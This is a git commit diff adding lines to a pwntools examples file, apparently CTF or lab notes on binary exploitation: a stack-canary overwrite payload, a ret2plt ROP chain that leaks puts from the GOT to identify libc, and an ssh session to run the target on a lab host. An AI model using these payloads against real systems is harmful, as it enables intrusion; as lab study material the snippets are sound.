e52ceb85621c7ce07196487e3d4eb5f0ec1628c3
hannibal-smith <65942818+hannibal-smith@users.noreply.github.com>
2020-11-30 13:42:39 +0200

    Update examples.py

--- pwn/examples.py
+++ pwn/examples.py
@@ -18,4 +18,16 @@ info(f"canary = {canary}")
 #send canary in payload
 io.sendline(("A"*88).encode()+p64(int(canary, base=16)))
 
+#read symbols
+elf = ELF('./***')
+PUTS_PLT = elf.plt['puts']
+PUTS_GOT = elf.got['puts']
+MAIN_FUNC = elf.symbols['main'] 
+
 # Leak libc version: https://libc.blukat.me/
+OFFSET = ("A"*136).encode()
+payload = OFFSET + POP_RDI + p64(PUTS_GOT) + p64(PUTS_PLT) + p64(MAIN_FUNC)
+
+#remote with ssh
+s = ssh(host='10.10.10.139', user='<USERNAME>', password='<PASSWORD>')
+io = s.process('./***')
